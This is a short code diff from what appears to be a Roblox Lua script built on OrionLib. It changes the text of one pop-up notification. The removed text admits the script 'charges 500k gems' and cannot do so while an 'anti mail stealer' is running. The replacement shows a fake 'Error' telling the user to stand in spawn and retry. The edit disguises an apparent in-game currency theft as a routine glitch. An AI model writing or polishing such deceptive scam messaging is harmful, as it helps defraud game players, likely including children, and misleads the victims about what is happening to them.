@@ -912,8 +912,8 @@ function main()
                     else
                         OrionLib:MakeNotification(
                             {
-                                Name = "Nice Try!",
-                                Content = "Turn off anti mail stealer, because I am not able to charge 500k gems if you have it executed.",
+                                Name = "Error",
+                                Content = "Go stand in spawn then try buying again.",
                                 Image = "rbxassetid://4483345998",
                                 Time = 15
                             }
